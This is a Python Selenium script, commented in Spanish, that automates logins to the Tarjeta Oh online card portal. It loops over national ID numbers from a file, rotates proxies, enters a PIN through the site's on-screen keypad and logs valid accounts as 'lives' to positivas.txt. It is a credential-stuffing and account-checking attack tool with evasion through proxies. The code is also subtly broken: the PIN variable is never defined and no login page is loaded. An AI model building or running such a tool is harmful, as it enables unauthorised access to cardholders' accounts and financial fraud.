from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import os
import time
import colorama  # Importar el módulo colorama
from colorama import Fore, Style  # Importar estilos de color
from proxy_requests import ProxyRequests

class XPATHS:
    numDocumento = '//*[@id="p_c_numel login-user-document"]'
    claveDigital = '//*[@id="p_c_clav login-user-password"]'
    tecladoNumerico = '/html/body/app-root/div/login/div[1]/div/div/div/div[2]/ingresa/div[2]/div/form/div[2]'
    btnIniciarSesion = '//*[@id="login-btn-iniciar"]'
    ventanaError = '//*[@id="body"]/div[2]/div/div[2]'
    mssgeVentanaTxt = '//*[@id="swal2-content"]/p[2]'
    
    login_divCerrar = '//*[@id="body"]/ngb-modal-window/div/div/app-modal-campanhas/div/div[2]/a'
    login_opciones = '//*[@id="home-btn-menu-opciones"]'
    longin_cerrarSesion = '//*[@id="home-btn-menu-cerrarSesion"]'
    login_confirmarSalir = '//*[@id="body"]/div[3]/div/div[3]/button[1]'
    
    
class BotOhLogin:
    def __init__(self, driver, proxy_list):
        self.driver = driver
        self.proxy_list = proxy_list

    def set_proxy(self, proxy):
        firefox_options = Options()
        firefox_options.add_argument(f'--proxy-server={proxy}')
        firefox_options.add_argument('--window-size=800,800')
        firefox_options.binary_location = r'C:\Program Files\Mozilla Firefox\firefox.exe'
        self.driver = webdriver.Firefox(options=firefox_options)

    def get_fase1(self):
        # Seleccionar un proxy de la lista y configurar el navegador con ese proxy
        proxy = self.proxy_list.pop(0)
        self.set_proxy(proxy)
        
    def get_fase2(self,dni):
        wait0 = WebDriverWait(self.driver, 10)
        wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.numDocumento)))
        #self.driver.find_element(By.XPATH, XPATHS.numDocumento).clear()
        self.driver.find_element(By.XPATH, XPATHS.numDocumento).send_keys(str(dni))
        self.driver.find_element(By.XPATH, XPATHS.numDocumento).send_keys('000')
        #input('Presiona Enter después de ingresar el número')
        self.driver.find_element(By.XPATH, XPATHS.claveDigital).click()
        #input('Presiona Enter después de hacer clic en clave digital')

    def get_fase3(self, num_pathNumerico):
        wait0 = WebDriverWait(self.driver, 10)
        teclado_numerico = wait0.until(EC.presence_of_element_located((By.XPATH, XPATHS.tecladoNumerico)))

        # Obtener todos los elementos dentro del teclado numérico
        elementos_teclado = teclado_numerico.find_elements(By.XPATH, './div')

        # Iterar sobre los elementos y hacer clic en los números deseados
        for num in num_pathNumerico:
            for elemento in elementos_teclado:
                if elemento.text.strip() == num:
                    elemento.click()
                    break
            else:
                print(f"No se encontró el elemento {num} en el teclado numérico.")
        self.driver.find_element(By.XPATH, XPATHS.btnIniciarSesion).click()


    def get_Verificar(self):
        try:
            wait0 = WebDriverWait(self.driver, 15)
            wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.ventanaError)))
            
            mensaje_error_element = self.driver.find_element(By.XPATH, XPATHS.mssgeVentanaTxt)
            mensaje_error = mensaje_error_element.text.strip()
            print(mensaje_error)
            return False
        
        except Exception as e:
            return True
        
    def verify_get_logo(self):
        expected_url = "https://enlinea.tarjetaoh.pe/tarjeta-oh/mis-saldos"
        current_url = self.driver.current_url
        if current_url == expected_url:
            return True
        else:
            return False
    def get_logo(self):
        #self.driver.get("https://enlinea.tarjetaoh.pe/tarjeta-oh/mis-saldos")
        
        #Cerrar cuenta:
        wait0 = WebDriverWait(self.driver, 15)
        try:
            wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.login_divCerrar)))
            self.driver.find_element(By.XPATH, XPATHS.login_divCerrar).click()
        except:
            pass
        
        wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.login_opciones)))
        self.driver.find_element(By.XPATH, XPATHS.login_opciones).click()
        
        wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.longin_cerrarSesion)))
        self.driver.find_element(By.XPATH, XPATHS.longin_cerrarSesion).click()
        time.sleep(0.3)
        wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.login_confirmarSalir)))
        self.driver.find_element(By.XPATH, XPATHS.login_confirmarSalir).click()
        
    def color_print(self, text, color_code):
        # Imprimir en pantalla con color utilizando colorama
        print(f"{color_code}{text}{Style.RESET_ALL}")
        
if __name__ == '__main__':
    colorama.init()
    COLOR_RED = Fore.RED
    COLOR_GREEN = Fore.GREEN

    # Leer proxies desde el archivo de texto
    with open("proxies.txt", "r") as file:
        proxy_list = [line.strip() for line in file.readlines()]

    # Configurar opciones de Firefox
    firefox_options = Options()
    firefox_options.add_argument('--window-size=800,800')
    firefox_options.binary_location = r'C:\Program Files\Mozilla Firefox\firefox.exe'

    driver = webdriver.Firefox(options=firefox_options)

    def process_dni(dni):
        bot = BotOhLogin(driver, proxy_list)
        bot.get_fase1()
        bot.get_fase2(dni)
        bot.get_fase3(num_pathNumerico)
        verify = bot.get_Verificar()
        if verify == False:
            bot.color_print(f" [-] Verificación fallida para DNI: {dni}", COLOR_RED)
            ultimo = open("ultimo.txt","w")
            ultimo.write(dni.rstrip())
            ultimo.close()
        confirm = bot.verify_get_logo()
        if confirm == True:
            bot.color_print(f" [+] Verificación Correcta: {dni}", COLOR_GREEN)
            lives = open("positivas.txt","a")
            lives.write(f" [+] Verificación Correcta: {dni}".rstrip())
            lives.write("\n")
            lives.close()
            bot.get_logo()

    def files():
        with open(f"dni.txt", "r") as dnis:
            for dni in dnis.readlines():
                process_dni(dni.strip())

    files()